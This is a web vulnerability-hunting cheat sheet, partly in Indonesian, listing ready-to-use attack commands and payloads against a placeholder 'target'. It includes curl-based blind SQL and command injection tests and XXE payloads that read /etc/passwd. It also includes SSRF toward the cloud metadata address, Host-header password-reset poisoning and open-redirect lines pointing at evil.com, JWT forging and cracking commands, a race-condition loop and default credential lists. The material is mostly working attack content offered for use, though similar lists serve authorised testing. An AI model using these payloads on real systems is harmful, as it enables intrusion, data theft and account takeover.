# MICRO-VULN HUNTING — Complete Detection Guide
## Last Updated: Mon Jul 06 2026

## ⚡ TIMING SIDE-CHANNEL
### Blind SQLi via timing:
time curl -sk -o /dev/null -w '%{time_total}' "http://target?id=1"
time curl -sk -o /dev/null -w '%{time_total}' "http://target?id=1'+AND+SLEEP(5)--+-"
# Delta > 2s = CONFIRMED BLIND SQLi

### Blind Command Injection:
time curl -sk -o /dev/null -w '%{time_total}' "http://target?cmd=echo+a"
time curl -sk -o /dev/null -w '%{time_total}' "http://target?cmd=sleep+5"

## ⚡ ERROR DIFFERENTIAL
### Compare responses between similar requests
# SQL error: 1' vs 1"
# Type confusion: numeric vs string input
# Format confusion: JSON vs XML vs form

### Common error signatures:
# "SQLSTATE" → MySQL/PostgreSQL error
# "Whoops" → Laravel debug
# "Symfony" → Symfony profiler
# "Stack trace" → Debug mode
# "Notice: Undefined" → PHP info leak
# "Fatal error" → PHP crash info

## ⚡ STATUS CODE ORACLE
# 200 = exists
# 301/302 = redirects (check location)
# 401 = unauthorized (try bypass)
# 403 = forbidden (try bypass: method switch, path traversal, header injection)
# 404 = not found (try variations)
# 405 = method not allowed (switch methods!)
# 500 = server error (may reveal info)
# 429 = rate limited (rotate headers)

## ⚡ RESPONSE SIZE DIFF
# Bandingin ukuran response:
curl -sk "http://target?id=1" | wc -c
curl -sk "http://target?id=1'+AND+'1'='1" | wc -c
curl -sk "http://target?id=1'+AND+'1'='2" | wc -c
# Size berbeda = boolean blind SQLi!

## ⚡ HEADER INJECTION POINTS
# Test every header for injection:
headers = [
    'X-Forwarded-For: 127.0.0.1',
    'X-Real-IP: 127.0.0.1',
    'X-Forwarded-Host: evil.com',
    'X-Original-URL: /admin',
    'X-Rewrite-URL: /admin',
    'X-HTTP-Method-Override: PUT',
    'X-HTTP-Method: DELETE',
    'X-Forwarded-Scheme: http',
]

## ⚡ CONTENT-TYPE CONFUSION
# Kirim request yang sama dengan Content-Type berbeda:
# application/json → application/xml → text/plain → multipart/form-data
# Beda parser = beda behavior = potensi bypass

## ⚡ METHOD CONFUSION
# Coba semua HTTP method di SETIAP endpoint:
# GET → POST → PUT → PATCH → DELETE → OPTIONS → HEAD → TRACE → CONNECT

## ⚡ PARAMETER POLLUTION
# Split suspicious keywords across params:
?id=1 UNION&id=SELECT 1,2,3--
?page=..&page=/etc/passwd
?role=user&role=admin

## ⚡ UNICODE NORMALIZATION BYPASS
# Case conversion bypass:
# 'ß' → 'SS' in uppercase (Java, C#)
# 'ı' → 'i' (Turkish dotless i)
# 'K' → 'k' (Kelvin sign)
# 'Å' → 'AA' (Danish)

## ⚡ DOUBLE ENCODING
%2527 → %27 → ' (WAF decode once, backend decode again)
%25252f → %252f → %2f → /

## ⚡ HTTP Request Smuggling
# CL.TE: send Content-Length + Transfer-Encoding
# TE.CL: send Transfer-Encoding + Content-Length
# TE.TE: obfuscate Transfer-Encoding header

## ⚡ CACHE POISONING
# X-Forwarded-Host: evil.com → cache serves page with evil.com links
# X-Forwarded-Scheme: http → cache serves HTTP version (mixed content)

## ⚡ RACE CONDITION DETECTION
# Parallel requests:
for i in {1..50}; do curl -sk "http://target/promo?code=FREE100" -X POST & done
wait

## ⚡ PROTOTYPE POLLUTION (Node.js)
# Check via JSON body:
# {"__proto__": {"admin": true}}
# {"constructor": {"prototype": {"admin": true}}}
# Check via query string:
# ?__proto__[admin]=true
# ?constructor[prototype][admin]=true

## ⚡ JWT ATTACK VECTORS
# None algorithm:
jwt_tool <token> -X a
# Weak secret:
hashcat -m 16500 <jwt> rockyou.txt
# Algorithm confusion (RS256→HS256):
jwt_tool <token> -X k -pk public.pem
# Kid injection:
jwt_tool <token> -X i -I "kid: ../../dev/null"

## ⚡ GRAPHQL BATCHING
# Bypass rate limit — send 1000 queries in 1 request:
{"query":"{a:user(id:1){id},b:user(id:2){id},...1000times...}"}

## ⚡ OData/API Query Manipulation
/$filter, /$expand, /$select, /$orderby, /$top, /$skip
/api/users?$filter=role eq 'admin'
/api/users?$expand=orders
/api/users?$select=password

## ⚡ WEB ASSEMBLY (WASM) ANALYSIS
# Download and decompile WASM
curl -sk "http://target/static/module.wasm" -o /tmp/app.wasm
# Check for hardcoded secrets, API endpoints

## ⚡ SERVER-SIDE PROTOTYPE POLLUTION (Python/Node)
# Check via __init__.__globals__ pattern in SSTI
# Check via constructor.prototype in JSON parsers

## ⚡ XXE VIA FILE UPLOAD
# Upload SVG with XXE:
"""
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg>&xxe;</svg>
"""
# Upload DOCX with XXE (OOXML)

## ⚡ SSRF VIA PDF GENERATION
# If wkhtmltopdf or puppeteer used:
# Payload in URL param:
<iframe src="file:///etc/passwd"></iframe>
<img src="http://169.254.169.254/latest/meta-data/">

## ⚡ SERVER-SIDE REQUEST FORGERY VIA REDIRECT
# Open redirect → SSRF:
http://target/redirect?url=http://evil.com
# Chain to internal: http://target/redirect?url=http://169.254.169.254/

## ⚡ HOST HEADER INJECTION
# Password reset poisoning:
curl -sk -H "Host: evil.com" "http://target/reset" -d "email=user@target.com"
# If reset link contains Host header → account takeover

## ⚡ COOKIE ATTRIBUTES
# Check: HttpOnly? Secure? SameSite? Domain?
curl -skI "http://target" | grep -i set-cookie

## ⚡ DEFAULT CREDENTIALS
# Try on every login page:
admin:admin, admin:password, admin:1234, root:root,
admin:admin123, admin:letmein, admin:welcome, test:test,
guest:guest, user:pass, admin: (blank), root:toor

## ⚡ DEBUG MODE
# Laravel: /_debugbar, /_ignition, /telescope, /clockwork
# Symfony: /_profiler, /_error, /_wdt
# Django: /__debug__
# Flask: /console (Werkzeug PIN)
# Rails: /rails/info
# Express: /debug, /__admin
# Spring: /actuator, /actuator/env
# ASP.NET: /trace.axd, /elm.axd

